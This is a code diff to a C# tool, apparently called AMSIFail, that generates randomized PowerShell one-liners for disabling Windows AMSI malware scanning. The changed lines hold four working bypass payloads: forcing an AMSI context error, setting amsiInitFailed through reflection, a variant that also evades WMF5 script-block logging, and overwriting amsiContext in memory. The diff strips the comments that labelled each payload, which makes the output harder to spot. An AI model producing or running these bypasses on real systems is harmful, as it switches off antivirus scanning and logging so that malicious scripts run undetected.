@@ -168,8 +168,10 @@ namespace AMSIFail
             //Regex to pull out all strings inside '*' tags
             Regex rgStringRule = new Regex(@"\'(.*?)\'", RegexOptions.Compiled | RegexOptions.IgnoreCase);
 
+            MatchCollection matches = rgStringRule.Matches(examplePayloads);
+			
             //Pull all all results that are not empty
-            List<string> matchedStrings = rgStringRule.Matches(examplePayloads).Where(x => !string.IsNullOrEmpty(x.Value)).Select(x => x.Value).ToList();
+            List<string> matchedStrings = matches.Cast<Match>().Where(x => !string.IsNullOrEmpty(x.Value)).Select(x => x.Value).ToList();
 
             //if there is any results
             if (matchedStrings.Count() > 0)
@@ -207,16 +209,16 @@ namespace AMSIFail
         {
             //Unknown -Force error
             var memVar = RandomString(RandomNumber(3, 10));
-            var ForceErrer = "#Unknown - Force error \n$" + memVar + "=[System.Runtime.InteropServices.Marshal]::AllocHGlobal(" + ObfuscateInt(9076) + ");[Ref].Assembly.GetType(\"System.Management.Automation.AmsiUtils\").GetField(\"amsiSession\", \"NonPublic,Static\").SetValue($null, $null);[Ref].Assembly.GetType(\"System.Management.Automation.AmsiUtils\").GetField(\"amsiContext\", \"NonPublic,Static\").SetValue($null, [IntPtr]$" + memVar + ");";
+            var ForceErrer = "$" + memVar + "=[System.Runtime.InteropServices.Marshal]::AllocHGlobal(" + ObfuscateInt(9076) + ");[Ref].Assembly.GetType(\"System.Management.Automation.AmsiUtils\").GetField(\"amsiSession\", \"NonPublic,Static\").SetValue($null, $null);[Ref].Assembly.GetType(\"System.Management.Automation.AmsiUtils\").GetField(\"amsiContext\", \"NonPublic,Static\").SetValue($null, [IntPtr]$" + memVar + ");";
 
             // Using Matt Graebers Reflection method
-            var MattGRefl = "#Matt Graebers Reflection method \n[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);";
+            var MattGRefl = "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);";
 
             //Using Matt Graebers Reflection method with WMF5 autologging bypass
-            var MattGReflLog = "#Matt Graebers Reflection method with WMF5 autologging bypass \n[Delegate]::CreateDelegate((\"Func``3[String, $(([String].Assembly.GetType('System.Reflection.BindingFlags')).FullName), System.Reflection.FieldInfo]\" -as [String].Assembly.GetType('System.Type')), [Object]([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')),('GetField')).Invoke('amsiInitFailed',(('NonPublic,Static') -as [String].Assembly.GetType('System.Reflection.BindingFlags'))).SetValue($null,$True);";
+            var MattGReflLog = "[Delegate]::CreateDelegate((\"Func``3[String, $(([String].Assembly.GetType('System.Reflection.BindingFlags')).FullName), System.Reflection.FieldInfo]\" -as [String].Assembly.GetType('System.Type')), [Object]([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')),('GetField')).Invoke('amsiInitFailed',(('NonPublic,Static') -as [String].Assembly.GetType('System.Reflection.BindingFlags'))).SetValue($null,$True);";
 
             //Using Matt Graebers second Reflection method
-            var MattGref02 = "#Matt Graebers second Reflection method \n[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static').GetValue($null),0x" + random.Next(0, int.MaxValue).ToString("X") + ");";
+            var MattGref02 = "[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static').GetValue($null),0x" + random.Next(0, int.MaxValue).ToString("X") + ");";
 
             //Select a random method
             switch (RandomNumber(1, 5))
